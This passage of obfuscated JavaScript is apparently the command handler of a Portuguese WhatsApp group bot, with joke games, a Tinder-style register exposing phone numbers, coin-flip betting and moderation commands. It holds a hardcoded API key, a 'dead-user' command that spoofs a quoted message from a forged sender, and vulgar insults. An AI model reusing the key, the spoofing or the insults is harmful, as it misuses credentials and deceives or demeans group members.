              rate = _0x3ac611.slice(9);
              _0x5196be.sendMessage(_0x346d97, {
                'text': " ❰ Pesquisando a sua ficha de chance de ir para o céu : " + rate + " aguarde... ❱"
              });
              setTimeout(async () => {
                wew = "https://telegra.ph/file/6d7185cff72cd52c955f0.jpg";
                random = '' + Math.floor(Math.random() * 110);
                const _0x17a844 = {
                  url: wew
                };
                const _0x2cc370 = {
                  quoted: _0xd2050d
                };
                await _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x17a844,
                  'caption': "[⛩️] " + rate + (" A chance de você ir pro céu é de " + random + "% [⛩️] \n\n[🎴] Mas isso vai depender das escolhas que você fará ou fez durante sua vida [🎴]")
                }, _0x2cc370);
              }, 7000);
              break;
            case "inferno":
              if (!_0x89cd51) {
                return _0x50740b("Só pode ser utilizado este comando, em grupo.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              rate = _0x3ac611.slice(9);
              _0x5196be.sendMessage(_0x346d97, {
                'text': " ❰ Pesquisando a sua ficha de chance de ir para o inferno : " + rate + " aguarde... ❱"
              });
              setTimeout(async () => {
                wew = "https://telegra.ph/file/31c3dc9dba261cc425c7c.jpg";
                random = '' + Math.floor(Math.random() * 110);
                const _0x489998 = {
                  url: wew
                };
                const _0x2f1db7 = {
                  quoted: _0xd2050d
                };
                await _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x489998,
                  'caption': "[⛩️] " + rate + (" A chance de você ir pro inferno é de " + random + "% [⛩️] \n\n[🎴] Mas isso vai depender das escolhas que você fará ou fez durante sua vida [🎴]")
                }, _0x2f1db7);
              }, 7000);
              break;
            case "gadometro":
              if (!_0x89cd51) {
                return _0x50740b("Só pode ser utilizado este comando, em grupo.");
              }
              if (!_0x5c6233) {
                return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
              }
              if (_0x3a0a2c.includes('@')) {
                mention_id = _0x23d865.join('').replace('@', '') + "@s.whatsapp.net";
                var _0x21b9e0 = mention_id;
              }
              if (!_0x3a0a2c.includes('@')) {
                var _0x21b9e0 = _0x246d48;
              }
              _0x5196be.sendMessage(_0x346d97, {
                'text': "❰ Pesquisando Qual Tipo De Gado Você É: @" + _0x21b9e0.split('@')[0] + ", aguarde... ❱",
                'mentions': [_0x21b9e0]
              });
              setTimeout(async () => {
                wew = "https://telegra.ph/file/11e551cfb802043fbbb48.jpg";
                chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"];
                gado = chifre[Math.floor(Math.random() * chifre.length)];
                const _0x441026 = {
                  url: wew
                };
                const _0x4aecc6 = {
                  quoted: _0xd2050d
                };
                await _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x441026,
                  'caption': "[🐃] @" + _0x21b9e0.split('@')[0] + " É " + gado + " [🐃]"
                }, _0x4aecc6);
              }, 7000);
              break;
            case "rgtinder":
              {
                tinder = JSON.parse(fs.readFileSync("./DADOS/json/tinder.json"));
                let [_0x3ec020, _0x29e785, _0x1d47fa] = _0x11e99e.split('/');
                if (!_0x3ec020 || !_0x29e785 || !_0x1d47fa) {
                  return _0x50740b("informe nome idade e a bio separando com uma '/' \nex: " + _0x141936 + "rgtinder nome/idade/bio marcando uma imagem");
                }
                if (!_0x54198a && !_0xfefbae) {
                  return _0x50740b("marque uma imagem com a legenda: " + _0x141936 + "rgtinder " + _0x11e99e);
                }
                if (tinder.map(_0x2a5cc2 => _0x2a5cc2.id).indexOf(_0x246d48) >= 0) {
                  return _0x50740b("vc já está registrado");
                }
                imagemsg = _0x54198a ? _0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : _0xd2050d.message.imageMessage;
                if (!imagemsg) {
                  return _0x50740b("marque uma imagem com a legenda: " + _0x141936 + "rgtinder " + _0x11e99e);
                }
                image_msg = await getFileBuffer(imagemsg, "image");
                image_salved = await upload(image_msg);
                const _0x5843c1 = {
                  id: _0x246d48,
                  nome: _0x3ec020,
                  idade: _0x29e785,
                  bio: _0x1d47fa,
                  image: image_salved
                };
                tinder.push(_0x5843c1);
                fs.writeFileSync("./DADOS/json/tinder.json", JSON.stringify(tinder));
                _0x50740b("Registrado no tinder com sucesso");
              }
              break;
            case "resptinder":
              _0x5196be.sendMessage(_0x11e99e + "@s.whatsapp.net", {
                'text': _0x671b4b + " Gostou Do Seu Perfil Chame Ele Para Conversar\n\n" + ("contato: wa.me/" + _0x246d48.split('@')[0])
              });
              break;
            case "tinder":
              {
                if (!_0x5c6233) {
                  return _0x50740b("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x141936 + "modobrincadeira 1");
                }
                tinder = JSON.parse(fs.readFileSync("./DADOS/json/tinder.json"));
                if (tinder.map(_0x5f580d => _0x5f580d.id).indexOf(_0x246d48) < 0) {
                  return _0x50740b("registre-se no tinder, usando \n" + _0x141936 + "rgtinder nome/idade/bio");
                }
                ttt = tinder[Math.floor(Math.random() * tinder.length)];
                const _0x340efd = {
                  url: ttt.image
                };
                const _0x1b7f48 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x340efd,
                  'caption': "                  🔥𝐓𝐈𝐍𝐃𝐄𝐑🔥\n\n╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗   \n║ 🤗 𝐍𝐎𝐌𝐄: " + ttt.nome + "\n║ 📅 𝐈𝐃𝐀𝐃𝐄: " + ttt.idade + "\n║ 🔮 𝐁𝐈𝐎: " + ttt.bio + "\n║ 𝐰𝐚 𝐦𝐞: wa.me/" + ttt.id.split('@')[0] + "\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝   \n*Responda: " + _0x141936 + "tinder para próximo perfil*\n*ou*\n*" + _0x141936 + "resptinder " + ttt.id.split('@')[0] + " para dar like no perfil*\n",
                  'mentions': [ttt.id]
                }, _0x1b7f48);
              }
              break;
            case "perfil-tinder":
              {
                tinder = JSON.parse(fs.readFileSync("./DADOS/json/tinder.json"));
                try {
                  mencionado = _0xd2050d.message.extendedTextMessage.contextInfo.mentionedJid;
                  buy = mencionado[0];
                } catch {
                  buy = _0x246d48;
                }
                if (!buy) {
                  buy = _0x246d48;
                }
                ttt = tinder.find(_0x5460f7 => _0x5460f7.id == buy);
                if (!ttt) {
                  return _0x50740b("Usuario não registrado no tinder");
                }
                const _0x3f36b1 = {
                  url: ttt.image
                };
                const _0x3055fc = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'image': _0x3f36b1,
                  'caption': "                 🔥𝐓𝐈𝐍𝐃𝐄𝐑🔥\n\n╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗   \n║ 🤗 𝐍𝐎𝐌𝐄: " + ttt.nome + "\n║ 📅 𝐈𝐃𝐀𝐃𝐄: " + ttt.idade + "\n║ 🔮 𝐁𝐈𝐎: " + ttt.bio + "\n║ 𝐰𝐚 𝐦𝐞: wa.me/" + ttt.id.split('@')[0] + "\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝   ",
                  'mentions': [ttt.id]
                }, _0x3055fc);
              }
              break;
            case "dead-user":
              if (!_0xf59944) {
                return;
              }
              _0x50740b("Lotus ta on kkkkkkkk");
              try {} catch {}
              const _0x1a856d = {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@g.us"
              };
              const _0x5ae9de = {
                conversation: "Lotus Ta On E Passou Por Aqui"
              };
              const _0x1c1900 = {
                key: _0x1a856d,
                message: _0x5ae9de
              };
              seloo = _0x1c1900;
              const _0x1bbdf8 = {
                text: "seqcu"
              };
              const _0x285ead = {
                quoted: seloo
              };
              _0x5196be.sendMessage(_0x5e13bf, _0x1bbdf8, _0x285ead);
              break;
            case "rmtinder":
            case "sairtinder":
              if (_0x267d4b == "sairtinder") {
                tinder = JSON.parse(fs.readFileSync("./DADOS/json/tinder.json"));
                var _0x49253d = _0x246d48;
                _0x50740b("Pronto, você foi retirado do tinder com sucesso..");
              } else {
                if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("```SOMENTE MEU DONO CARAI KKKKKK```");
                }
                if (!_0x11e99e) {
                  return _0x50740b("cader o número?\nexemplo: " + _0x141936 + "rmtinder 5522995400244");
                }
                var _0x49253d = _0x11e99e.replace(new RegExp("[()+-/ +/]", 'gi'), '') + "@s.whatsapp.net";
              }
              blir = tinder.map(_0x21b396 => _0x21b396.id).indexOf(_0x49253d);
              if (blir < 0) {
                return _0x50740b("nao tem essa pessoa registrada não");
              }
              if (_0xf59944) {
                _0x50740b("Usuário foi tirado do tinder com sucesso");
              }
              tinder.splice(blir, 1);
              fs.writeFileSync("./DADOS/json/tinder.json", JSON.stringify(tinder));
              break;
            case "ppt":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Só pode ser utilizado este comando, em grupo.");
                }
                if (_0xd2050d.message.extendedTextMessage === undefined || _0xd2050d.message.extendedTextMessage === null) {
                  return _0x50740b("Marque alguém exemplo: " + (_0x141936 + _0x267d4b) + " @Lotus");
                }
                mentioned = _0xd2050d.message.extendedTextMessage.contextInfo.mentionedJid;
                if (_0x4c298f(_0x246d48) !== undefined || _0x4c298f(mentioned[0]) !== undefined) {
                  return _0x50740b("Jogador ocupado no momento");
                }
                const _0xfb025f = {
                  group: _0x346d97,
                  player1: _0x246d48,
                  jogada1: "undefined",
                  player2: mentioned[0],
                  jogada2: "undefined",
                  desafio: false
                };
                _0x1ddd1d.push(_0xfb025f);
                fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify(_0x1ddd1d, null, 2) + "\n");
                let _0x1046d8 = "O " + _0x671b4b + " está desafiando @" + mentioned[0].split('@')[0] + ", use " + _0x141936 + "aceitar para aceitar este desafio";
                let _0x3c40a9 = [mentioned[0].split('@')[0] + "@s.whatsapp.net"];
                const _0x2b62cf = {
                  text: _0x1046d8,
                  mentions: _0x3c40a9
                };
                const _0x5752b9 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x2b62cf, _0x5752b9);
                setTimeout(() => {
                  let _0x4fc769 = _0x4c298f(_0x246d48);
                  if (_0x1ddd1d[_0x4fc769] && _0x1ddd1d[_0x4fc769].desafio === false) {
                    _0x1ddd1d.splice(_0x4fc769, 1);
                    fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify(_0x1ddd1d, null, 2) + "\n");
                    _0x50740b("O jogo foi finalizado, porque o jogador que foi desafiado não aceitou no prazo de 30 segundos");
                  }
                }, 30000);
              }
              break;
            case "aceitar":
              {
                let _0x22ea93 = _0x4c298f(_0x246d48);
                if (_0x1ddd1d[_0x22ea93].player2 === _0x246d48) {
                  _0x1ddd1d[_0x22ea93].desafio = true;
                  fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify(_0x1ddd1d, null, 2) + "\n");
                  _0xda5651(_0x1ddd1d[_0x22ea93].player1, _0x246d48);
                  _0x50740b("Irei Enviar As Opções No Privado.....");
                  const _0x18030e = {
                    text: "Desafio aceito, digite uma das opções:\n 🪨 Pedra, 🧻 Papel, ✂️ Tesoura"
                  };
                  _0x5196be.sendMessage(_0x1ddd1d[_0x22ea93].player1, _0x18030e);
                  const _0x589f98 = {
                    text: "Desafio aceito, digite uma das opções:\n 🪨 Pedra, 🧻 Papel, ✂️ Tesoura"
                  };
                  _0x5196be.sendMessage(_0x246d48, _0x589f98);
                }
              }
              break;
            case "resetppt":
              if (!_0x3f2f63) {
                return _0x50740b("Só ADM pode utilizar este comando.");
              }
              fs.writeFileSync("./DADOS/json/ppt.json", JSON.stringify([]));
              _0x50740b("Jogo resetado");
              break;
            case "block-temp":
              {
                if (!_0xf59944) {
                  return _0x50740b(enviar.msg.donosmt);
                }
                if (!_0x5e13bf) {
                  return _0x50740b("Informe o número do usuário");
                }
                if (!_0xd2050d.message.extendedTextMessage) {
                  return _0x50740b("Mencione o usuário.");
                }
                let _0x26c103 = _0x11e99e.split('/').pop();
                if (!_0x26c103) {
                  return _0x50740b("Formato inválido. Use: mencionar_usuario/tempo (ex: @12345/31d).");
                }
                if (_0x2c6390(_0x346d97).some(_0x1f9e1b => _0x1f9e1b.userId === _0x5e13bf)) {
                  return _0x50740b("Este usuário já está bloqueado.");
                }
                if (!_0x26c103) {
                  return _0x50740b("Informe o tempo (ex: 31d para 31 dia, 1m para 1 minuto, 1h para 1 hora).");
                }
                let [_0x4f2eb9, _0x18181b] = _0x26c103.match(/(\d+)([dhm])/).slice(1, 3);
                let _0x185007 = _0x18181b === 'd' ? "dia" : _0x18181b === 'h' ? "hora" : "minuto";
                if (parseInt(_0x4f2eb9) !== 1) {
                  _0x185007 += 's';
                }
                toMs = require('ms');
                let _0x41d2af = toMs('' + _0x4f2eb9 + _0x18181b) + Date.now();
                const _0x4389eb = {
                  userId: _0x5e13bf,
                  expired: _0x41d2af
                };
                _0x240d86(_0x346d97, _0x4389eb);
                _0x50740b("O usuário @" + _0x5e13bf.split('@')[0] + " foi bloqueado temporariamente por " + _0x4f2eb9 + " " + _0x185007 + '.');
              }
              break;
            case "unblock-temp":
              if (!_0xf59944) {
                return _0x50740b(enviar.msg.donosmt);
              }
              bv = _0xd2050d.message.extendedTextMessage.contextInfo.mentionedJid[0];
              if (!_0x2c6390(_0x346d97).map(_0x11ca99 => _0x11ca99.userId).includes(bv)) {
                return _0x50740b("Este usuario não está bloqueado");
              }
              _0x29b6e0(_0x346d97, bv);
              _0x50740b("O usuario " + bv.split('@')[0] + " Foi desbloqueado");
              break;
            case "listablock-temp":
              tkks = "╭─*「 *USUARIOS BLOQUEADOS* 」\n";
              for (let _0x5bdfd5 of _0x2c6390(_0x346d97).map(_0x114968 => _0x114968.userId)) {
                tkks += "│+  @" + _0x5bdfd5.split('@')[0] + "\n";
              }
              tkks += "│+ Total : " + _0x2c6390(_0x346d97).map(_0x4c1d29 => _0x4c1d29.userId).length + "\n╰─「 *" + NomeDoBot + "* 」──";
              const _0x4ee7fd = {
                quoted: _0xd2050d
              };
              await _0x5196be.sendMessage(_0x346d97, {
                'text': tkks.trim()
              }, _0x4ee7fd);
              break;
            case "blockcmd-temp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              tp = _0x23d865.join(" ");
              if (tp.includes("blockcmd") || tp.includes("unblockcmd")) {
                return _0x50740b("Tá louco maluco?, Quer banir o comando de bloquear comando?");
              }
              if (_0x4d1fb4(_0x346d97).length > 0 ? _0x4d1fb4(_0x346d97).map(_0x5c895b => _0x5c895b.cmd).includes(_0x23d865[0]) : false) {
                return _0x50740b("Este comando já está bloqueado");
              }
              if (!_0x23d865[1]) {
                return _0x50740b("Informe o tempo\nex: 31d = 31 dias\n1m = 1 minuto\n1h = 1 hora");
              }
              toMs = require('ms');
              _0x46a105(_0x346d97, {
                'cmd': _0x23d865[0],
                'expired': toMs(_0x23d865[1]) + Date.now()
              });
              _0x50740b("O comando " + _0x23d865[0] + " Foi bloqueado temporariamente");
              break;
            case "unblockcmd-temp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              tp = _0x23d865.join(" ");
              if (!_0x4d1fb4(_0x346d97).length > 0 ? _0x4d1fb4(_0x346d97).map(_0x3b1a1e => _0x3b1a1e.cmd).includes(_0x23d865[0]) : false) {
                return _0x50740b("Este comando já está  desbloqueado");
              }
              _0xc272d(_0x346d97, _0x23d865[0]);
              _0x50740b("O comando " + _0x23d865[0] + " Foi desbloqueado");
              break;
            case "listacomandos-temp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              tkks = "╭─*「 *COMANDOS BLOQUEADOS* 」\n";
              for (let _0x489375 of _0x4d1fb4(_0x346d97).map(_0x4afaa7 => _0x4afaa7.cmd)) {
                tkks += "│+  " + _0x489375 + "\n";
              }
              tkks += "│+ Total : " + _0x4d1fb4(_0x346d97).map(_0x1441d8 => _0x1441d8.cmd).length + "\n╰──────*「 *" + NomeDoBot + "* 」*────";
              const _0x20513e = {
                quoted: _0xd2050d
              };
              await _0x5196be.sendMessage(_0x346d97, {
                'text': tkks.trim()
              }, _0x20513e);
              break;
            case "listafake":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x3f2f63) {
                return _0x50740b(enviar.msg.adm);
              }
              if (!_0x42a9f2) {
                return _0x50740b(enviar.msg.Badmin);
              }
              teks = _0x2cd689 + " Números fakes no grupo: " + _0x2cd689 + "\n";
              men = [];
              for (let _0x14d565 of groupMembers) {
                if (!_0x14d565.id.startsWith(55)) {
                  teks += "┃✼❄ @" + _0x14d565.id.split('@')[0] + "\n";
                  men.push(_0x14d565.id);
                }
              }
              if (teks.indexOf("┃✼❄") < 0) {
                return _0x50740b("*Nenhum numero Gringo foi encontrado*");
              }
              const _0x3adad1 = {
                text: teks,
                mentions: men
              };
              _0x5196be.sendMessage(_0x346d97, _0x3adad1);
              break;
            case "animestick":
              try {
                _0x50740b(enviar.espere);
                let _0x2c4d77 = await fetchJson("https://api.bronxyshost.com.br/api-bronxys/pinterest?nome=figurinhasanime&apikey=Key_Do-Lotus_Samuel_EsDeath_12/08");
                _0x125a55(_0x346d97, _0x2c4d77[Math.floor(Math.random() * _0x2c4d77.length)], enviar.success)["catch"](_0x195a61 => {
                  _0x50740b("ERROR!!");
                });
              } catch (_0x6ac8ed) {
                if (JSON.stringify(_0x6ac8ed).includes("Key_Do-Lotus_Samuel_EsDeath_12/08")) {
                  return console.log("A api caiu ou não foi possivel executar esta ação., espere retornar");
                } else {
                  _0x50740b("ERROR!!");
                }
              }
              break;
            case "caracoroa":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                let [_0x439ddd, _0x461a8a] = _0x11e99e.split('/');
                if (!_0x439ddd || !_0x461a8a || !Number(_0x461a8a) && Number(_0x461a8a) < 0) {
                  return _0x50740b("Informe um valor acima de zero");
                }
                let _0x5bd06e = ["cara", "coroa"];
                if (!_0x5bd06e.includes(_0x439ddd.toLowerCase())) {
                  return _0x50740b("Informe uma face da moeda valida");
                }
                if (parseInt(_0x461a8a.trim()) > 50) {
                  return _0x50740b("valor maximo de aposta é 50.");
                }
                let _0x42519f = _0x326cbd[0].Chances.findIndex(_0x1f1c8f => _0x1f1c8f.id === _0x246d48);
                if (_0x42519f !== -1) {
                  if (_0x326cbd[0].Chances[_0x42519f].cara_coroa >= 3) {
                    return _0x50740b("*VOCÊ SÓ PODE USAR O COMANDO CARA COROA 3 VEZES AO DIA, AMANHÃ VOCÊ PODE USAR MAIS*");
                  } else {
                    if (_0x326cbd[0].Chances[_0x42519f].cara_coroa === 0) {
                      _0x326cbd[0].Chances[_0x42519f].cara_coroa = 1;
                    } else {
                      _0x326cbd[0].Chances[_0x42519f].cara_coroa += 1;
                    }
                    _0x137e44(_0x326cbd);
                  }
                } else {
                  const _0x2af464 = {
                    id: _0x246d48,
                    cara_coroa: 0x1
                  };
                  _0x326cbd[0].Chances.push(_0x2af464);
                  _0x137e44(_0x326cbd);
                }
                let _0x2e7c6a = rggold[_0x3befc0].usus;
                let _0x3a0426 = parseInt(_0x461a8a);
                if (parseInt(_0x2e7c6a[_0x52c696].Golds) < _0x3a0426) {
                  return _0x50740b("Você não tem ★ " + _0x3a0426 + " Gold(s) ★ para jogar, se deseja verificar quantos golds você tem, use o comando: " + _0x141936 + "gold");
                }
                _0x50740b("Sorteando A Face Da Moeda");
                delay(1000);
                let _0x240172 = _0x5bd06e[Math.floor(Math.random() * _0x5bd06e.length)];
                cararoa = fs.readFileSync("./DADOS/json/" + _0x240172 + ".webp");
                venceu = _0x240172 == _0x439ddd.toLowerCase();
                await delay(2000);
                if (venceu) {
                  rggold[_0x3befc0].usus[rggold[_0x3befc0].usus.findIndex(_0x1a0798 => _0x1a0798.id === _0x246d48)].Golds += _0x461a8a * 2;
                  _0x1564b4(rggold);
                  const _0x1e8910 = {
                    sticker: cararoa
                  };
                  const _0x18ba73 = {
                    quoted: _0xd2050d
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x1e8910, _0x18ba73);
                  delay(1000);
                  _0x50740b("Voce venceu, Caiu *" + _0x240172 + "* Foram Créditados em sua conta " + Number(_0x461a8a) * 2 + " gold");
                } else {
                  rggold[_0x3befc0].usus[rggold[_0x3befc0].usus.findIndex(_0x33d778 => _0x33d778.id === _0x246d48)].Golds -= _0x461a8a;
                  _0x1564b4(rggold);
                  const _0x598f97 = {
                    sticker: cararoa
                  };
                  const _0x531a2c = {
                    quoted: _0xd2050d
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x598f97, _0x531a2c);
                  delay(1000);
                  _0x50740b("Voce perdeu,Caiu *" + _0x240172 + "* Foram debitádos de sua conta " + Number(_0x461a8a) + " Cash");
                }
              }
              break;
            case "roleta":
              if (!_0x89cd51) {
                return _0x50740b("só grupo");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Quem é tu na fila do pão, somente adm 😂");
              }
              if (!_0x42a9f2) {
                return _0x50740b("o bot precisa de adm garai");
              }
              if (!_0x5c6233) {
                return _0x50740b("Modo brincadeira desativado, peça a algum adm");
              }
              jds = [];
              A2 = groupMembers;
              B2 = groupMembers;
              TAMBOR = ["na perna.", "na cabeça.", "no pescoço.", "no peito.", "no olho.", "no estômago.", "na boca.", "na perna.", "na testa.", "no braço."];
              C2 = A2[Math.floor(Math.random() * A2.length)];
              if (C2 === _0x246d48 || C2 === _0x517366 + "@s.whatsapp.net") {
                return repply("*Escolhi* @" + C2.id.split('@')[0] + " mas infelizmente correu de covardia...*");
              }
              tpa = TAMBOR[Math.floor(Math.random() * TAMBOR.length)];
              _0x50740b("*A escolha é minha! 1 membro irá morrer, que os jogos comecem...* ");
              setTimeout(() => {
                D1 = "*Que pena... você não sobreviveu ao meu jogo* @" + C2.id.split('@')[0] + ", *hora de enterrar o cadáver, infelizmente morreu com tiro* *" + tpa + '*';
                _0x1106fd(D1, jds, true);
              }, 5000);
              jds.push(C2.id);
              setTimeout(() => {
                jds.push(C2.id);
                _0x5196be.groupParticipantsUpdate(_0x346d97, [C2.id], '☠️');
                cararoa = fs.readFileSync("./DADOS/json/roleta.webp");
                const _0x904b88 = {
                  sticker: cararoa
                };
                const _0x14dfa1 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x904b88, _0x14dfa1);
              }, 6000);
              break;
            case "roll":
              var [_0x4252dd, _0x4dab8d] = _0x11e99e.toLowerCase().trim().split('d');
              var [_0x152a18] = _0x11e99e.toLowerCase().trim().split('+') || 0;
              if (parseInt(_0x4252dd) > 200) {
                return _0x50740b("Quantidade de dados muito exagerado.");
              }
              if (!_0x11e99e.toLowerCase().includes('d')) {
                return _0x50740b("Exemplo: " + _0x141936 + "roll 2d20");
              }
              if (!Number(parseInt(_0x4dab8d))) {
                return _0x50740b("Exemplo: " + _0x141936 + "roll 2d20");
              }
              let _0x7641a6 = "Resultado dos Dados:\n\n";
              for (_0x3194f3 = 0; _0x3194f3 < _0x4252dd; _0x3194f3++) {
                _0x7641a6 += "[ " + (_0x3194f3 + 1) + " ] " + Math.floor(Math.random() * parseInt(_0x4dab8d) + parseInt(_0x152a18)) + "\n\n";
              }
              _0x50740b(_0x7641a6);
              break;
            case "infoanotacao":
              _0x5196be.sendMessage(_0x346d97, {
                'text': anotacao(_0x141936)
              });
              break;
            case "tabela":
              const _0x5da977 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': tabela(_0x141936, NomeDoBot)
              }, _0x5da977);
              break;
            case "infobemvindo":
            case "infobv":
              const _0x4b4a59 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infobemvindo(_0x141936)
              }, _0x4b4a59);
              break;
            case "idiomas":
            case "idioma":
              const _0x30d710 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': idiomagtts(_0x141936, NomeDoBot)
              }, _0x30d710);
              break;
            case "infoforca":
              _0x50740b("como adicionar palavras no comando forca.\nExemplo: " + _0x141936 + "addpalavras_forca gato|Animal|Ele mia\n\nExemplo para tirar a palavra do comando forca, é só usar:\n\n" + _0x141936 + "rmpalavra_forca gato\n\nboa sorte.\n");
              break;
            case "infolimitarcomando":
              _0x50740b("Este comando é composto por 2:\n\n1: " + _0x141936 + "tempocmd\n\n2: " + _0x141936 + "limitarcomando\n\nApós ativar o " + _0x141936 + "limitarcomando qualquer usuário sem ser adm, vip ou dono usar algum comando, só poderá ser executado depois de 1 minuto, se quiser aumentar o tempo ou diminuir, use:\n\n" + _0x141936 + "tempocmd 120\n\ncoloquei 120 = 2 minutos de tempo, se colocar 20, será igual a 20 segundos por comando, então boa sorte no que quiser colocar, lembrando que tem 1 minuto por padrão após ativar.");
              break;
            case "infopremium":
              _0x50740b("Informação sobre o novo recurso de escolher qual comando vai ser,\npremium.\n\n- Comando: " + _0x141936 + "cmdpremium \neste comando vai mostrar quais comandos está premium.\n\n- Comando: " + _0x141936 + "addcmdpremium\neste comando você vai usar pra adicionar o comando de premium, por exemplo:\n" + _0x141936 + "addcmdpremium play_audio ae o comando play_audio, so vai poder ser\nutilizado por premium KKK\n\n- Comando: " + _0x141936 + "tirarcmdpremium\njá este comando, ele vai tirar o comando da lista premium, que você adiciono,\nexemplo: " + _0x141936 + "tirarcmdpremium play_audio\n\nBoa sorte.");
              break;
            case "infoduelo":
              _0x5dcc57(infoduelo(_0x141936, _0x246d48));
              break;
            case "infomultiprefixo":
            case "infomultiprefix":
              _0x5dcc57(_0x33c0c0 + " @" + _0x45b1c6 + ", Irei informar como funciona a função de multiplos prefixo.\n\nEssa função é por grupo, feito em um, não será feito em todos.\n\nPrimeiramente, ativar ele com \n\n" + _0x141936 + "multiprefixo usando primeira vez ele ativa, depois ele desativa... E assim vai em diante..\n\nContém os seguintes comandos:\n\n" + _0x141936 + "add_prefixo\n\n" + _0x141936 + "tirar_prefixo\n\n" + _0x141936 + "prefixos\n\nExemplo do primeiro comando >\n\n" + _0x141936 + "add_prefixo &\n\nO & que usei como exemplo, vai passar a ser um prefixo oficial do grupo, então se usar " + _0x141936 + " ou & funcionará, pode adicionar quantos quiser.. \n\nE pra tirar vai fazer o seguinte\n" + _0x141936 + "tirar_prefixo &\n\nE pra verificar os prefixos que foi adicionado \n\n" + _0x141936 + "prefixos\n\nÉ isso, boa sorte...");
              break;
            case "infosorteio":
            case "helpsorteio":
              const _0x1106ef = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infosorteio(_0x141936, _0x671b4b)
              }, _0x1106ef);
              break;
            case "infocontador":
            case "infobanghost":
              const _0x487c49 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infocontador(_0x141936, _0x671b4b)
              }, _0x487c49);
              break;
            case "infolistanegra":
              const _0x5c31c4 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infolistanegra(_0x141936, _0x671b4b)
              }, _0x5c31c4);
              break;
            case "infotransmitir":
              const _0x3e7aa6 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infotransmitir(_0x141936, _0x671b4b)
              }, _0x3e7aa6);
              break;
            case "infopalavrão":
            case "infopalavrao":
              const _0x385bfd = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infopalavrao(_0x141936, _0x671b4b)
              }, _0x385bfd);
              break;
            case "infobancarac":
              const _0x2341e4 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': infobancarac(_0x141936, _0x671b4b)
              }, _0x2341e4);
              break;
            case "addautorm":
            case "addautoban":
            case "listanegra":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Precisa ser Dono ou Adm");
              }
              if (!_0x44cf80) {
                return _0x50740b("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja adicionar na lista negra..");
              }
